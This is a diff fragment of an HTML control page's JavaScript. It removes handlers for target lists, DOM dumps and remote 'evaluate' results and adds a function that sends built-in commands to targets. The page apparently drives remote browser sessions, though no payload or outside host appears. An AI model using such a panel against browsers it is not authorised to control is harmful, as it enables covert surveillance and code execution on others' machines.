-            refreshTargets(targets);
-        }
-
-        function process_GetTargetText(result) {
-            console.log('GetTargetText');
-            // TODO implement -- show text in ui
-        }
-
-        function process_GetClientCommands(result) {
-            refreshCommandsTable(result);
-        }
-
-        function process_GetTargetHTML(result, message) {        
-            logmsg('GetTargetHTML');        
-        }
-
-        function process_RefreshDOM(result, message) {
-
-            result = atob(result);
-
-            try {
-                result = JSON.parse(result);
-            } catch (ex) {
-                logmsg(ex);
-            }
-
-            result = result || {};
-
-            refreshTable('domList', result);
-
-            reloadJsonTree(result);
-        }
-
-        function process_GetFrontendUrls(result, message) {
-
-            if (Array.isArray(result) && result.length > 0) {
-                result = result[0];
-            }
-
-            document.getElementById('devtoolsFrontendUrl').value = result.devtoolsFrontendUrl;
-        }
-
-        function process_GetTargets(result, message) {
-            try {
-                if ( message.isbase64 ) {
-                    result = atob(result);
-                    result = JSON.parse(result);
-                }
-            } catch (e) {
-
-            }
-
-            let targets = result;
-            // TODO validate targets before updating
-            targetslist = targets;
-            refreshTargets(targets);
-        }
-
-        function process_ExecEvaluate(result, message) {
-
-            result = atob(result);
-            try {
-                result = JSON.parse(result);
-            } catch (ex) {
-                
-            }
-
-            result = result || {};
-            
-            keys = [ 'builtincmd', 'cmdid', 'resultid', 'targetId' ];
-
-            keys.forEach( key => {
-                result[key] = message[key];
-            });
-            
-            addResult(result);
-        }
-
-    </script>
 
     <!-- commands logic -->
     <script>
+        function execBuiltInCmd(cmdname) {
+            // TODO check if cmdname is supported
+            let cmdpayload = createBuiltInCmd(cmdname);
+            jspb.sendMessage(cmdpayload);
+        }
+
         function executeTargetCmd() {
             console.log('executeTargetCmd');
 
@@ -1408,8 +1380,8 @@
 
             jsonTree.appendChild(createJSONTree(data));
         }
-
     </script>
+
 </body>
 
 </html>
